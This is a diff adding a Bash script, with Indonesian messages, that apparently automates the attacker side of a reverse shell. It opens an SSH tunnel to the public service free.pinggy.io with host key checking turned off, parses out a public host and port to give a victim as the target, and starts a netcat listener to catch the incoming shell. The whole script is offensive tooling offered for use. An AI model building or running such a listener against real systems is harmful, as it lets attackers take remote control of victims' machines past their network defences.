@@ -1,0 +1,74 @@
+#!/bin/bash
+
+if ! command -v ssh &> /dev/null; then
+    echo "Error: Perintah 'ssh' tidak ditemukan. Silakan install openssh-client terlebih dahulu."
+    exit 1
+fi
+
+echo "================================="
+echo "  AUTOMATED REVERSE SHELL "
+echo "================================="
+
+
+echo -n "Masukkan Port : "
+read port
+
+
+if [ -z "$port" ]; then
+    echo "Error: Port tidak boleh kosong!"
+    exit 1
+fi
+
+echo "---------------------------------"
+echo "[-] Mematikan sisa sesi sebelumnya..."
+pkill -f "tcp@free.pinggy.io" 2>/dev/null
+
+echo "[-] Menyalakan TCP Tunnel di background pada port $port..."
+
+
+LOG_FILE="/tmp/pinggy_$port.log"
+rm -f "$LOG_FILE"
+
+
+ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:127.0.0.1:"$port" tcp@free.pinggy.io > "$LOG_FILE" 2>&1 &
+
+echo "[-] Menunggu membuat tunnel dan mendapatkan alamat..."
+
+for i in {1..6}; do
+    sleep 1
+    pinggy_url=$(grep -o 'tcp://[^ ]*' "$LOG_FILE" | head -n 1)
+    if [ ! -z "$pinggy_url" ]; then
+        break
+    fi
+done
+
+if [ -z "$pinggy_url" ]; then
+    echo "⚠️  Gagal mengambil alamat!"
+    echo "Isi log error terakhir:"
+    cat "$LOG_FILE" 2>/dev/null
+    pkill -f "tcp@free.pinggy.io" 2>/dev/null
+    rm -f "$LOG_FILE"
+    exit 1
+fi
+
+clean_url=$(echo "$pinggy_url" | sed 's/tcp:\/\///')
+pinggy_host=$(echo "$clean_url" | cut -d':' -f1)
+pinggy_port=$(echo "$clean_url" | cut -d':' -f2)
+
+echo "================================="
+echo "🔥 REVSHELL BERHASIL DIBUAT 🔥"
+echo "================================="
+echo "HOST/IP TARGET : $pinggy_host"
+echo "PORT TARGET    : $pinggy_port"
+echo "================================="
+echo "[-] Menjalankan Listener: nc -lvnp $port"
+echo "---------------------------------"
+
+
+nc -lvnp "$port"
+
+
+echo -e "\n[-] Menutup sesi..."
+pkill -f "tcp@free.pinggy.io" 2>/dev/null
+rm -f "$LOG_FILE"
+echo "[+] Selesai."
